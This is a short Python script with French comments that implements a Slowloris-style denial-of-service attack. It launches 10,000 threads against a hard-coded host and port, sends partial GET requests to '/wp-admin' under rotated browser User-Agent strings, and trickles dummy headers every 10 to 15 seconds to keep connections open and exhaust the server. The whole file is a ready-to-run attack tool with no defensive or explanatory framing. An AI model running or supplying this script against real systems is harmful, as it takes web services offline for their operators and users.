import socket
import random
import time
import threading
import sys

# Paramètres
host = "192.168.1.6"
port = 8080
sockets = 10000  # Nombre de sockets
path = "/wp-admin"  # Endpoint lourd
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(user_agents)}\r\n\r\n".encode()
            s.send(request)
            while True:
                s.send(b"X-a: b\r\n")  # Garde la connexion ouverte
                time.sleep(random.uniform(10, 15))  # Délai aléatoire
        except:
            pass

# Lancer les sockets avec des threads
print(f"Attacking {host}:{port} on {path} with {sockets} sockets")
threads = []
for _ in range(sockets):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

# Maintenir les threads actifs
for t in threads:
    t.join()
